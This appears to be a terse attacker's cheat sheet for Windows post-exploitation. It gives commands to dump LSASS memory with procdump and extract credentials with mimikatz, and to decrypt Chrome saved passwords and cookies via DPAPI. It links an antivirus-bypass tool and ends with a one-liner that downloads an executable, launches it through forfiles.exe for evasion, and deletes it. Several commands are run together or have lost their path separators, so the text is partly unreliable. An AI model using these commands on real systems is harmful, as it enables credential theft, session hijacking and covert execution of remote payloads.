
<p align="center">
  <body>
    <img src="2zHQ.gif" width="500" height="300">
  </body>
</p>

````
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmpsekurlsa::dpapi

````
## Mimikatz Chrome-dump

````
mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotectbeacon> mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
````
### Chrome cookies

````
 dpapi::chrome /in:"%localappdata%GoogleChromeUser DataDefaultCookies" /unprotect
````



## Download with Powershell

https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

https://adamtheautomator.com/powershell-download-file/


````
Invoke-WebRequest -Uri $url -OutFile $output
````

````
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
````

bYpASS

https://github.com/tokyoneon/Chimera



````
powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
````
